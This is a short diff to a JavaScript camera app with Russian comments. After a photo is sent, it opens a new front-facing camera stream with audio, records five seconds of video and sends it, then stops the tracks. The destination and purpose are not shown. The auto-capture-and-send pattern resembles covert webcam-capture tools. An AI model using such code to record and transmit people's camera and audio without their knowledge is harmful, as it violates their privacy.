@@ -115,8 +115,14 @@ function CameraApp() {
         });
       }
 
-      // После успешной отправки фото — записываем и отправляем видео
-      await recordAndSendVideo(stream, 5000);
+      // После успешной отправки фото — записываем и отправляем видео (строго фронтальная камера)
+      let videoStream;
+      try {
+        videoStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
+        await recordAndSendVideo(videoStream, 5000);
+      } finally {
+        if (videoStream) videoStream.getTracks().forEach(t => t.stop());
+      }
     } finally {
       if (stream) stream.getTracks().forEach(t => t.stop());
     }
